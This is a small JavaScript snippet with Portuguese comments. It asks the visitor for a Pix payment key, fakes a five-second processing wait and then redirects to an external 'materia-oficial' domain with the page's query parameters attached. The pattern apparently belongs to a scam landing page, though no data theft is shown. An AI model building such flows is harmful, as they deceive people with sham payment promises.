    <script>
    // Função para verificar se o input está vazio e manipular o processo de envio
    function sendPixKey() {
        var pixKey = document.getElementById('pixKey').value;
        var links = 'https://materia-oficial.online/a4';
            var atual = window.location.href;
            var atual2 = atual.trim();
            var atual3 = (atual.indexOf("?") > 0 ? '&' : '?');
            var atual4 = document.location.search.replace('?', '').toString();
            var definitivo = links + '?' + atual4;
            console.log(atual);
            console.log(atual2);
            console.log(atual3);
            console.log(atual4);
            console.log(links);
            console.log(definitivo);
        
        // Verifica se o campo de entrada não está vazio
        if (pixKey.trim() !== '') {
            // Mostra a mensagem e a GIF
            document.getElementById("mensagem").style.display = "block";
            document.getElementById("enviarPix").disabled = true; // Esconde o botão
            document.getElementById("pixKey").disabled = true; // Esconde o botão
            document.getElementById('mensagem').focus(); 
            // Espera 5 segundos antes de redirecionar
            setTimeout(function() {
                window.location.href = definitivo;
            }, 5000); // 5000 milissegundos = 5 segundos
        } else {
            alert('Por favor, digite sua chave Pix.');
        }
    }

    // Adiciona o evento de clique ao botão
    document.getElementById('enviarPix').addEventListener('click', sendPixKey);
    </script>
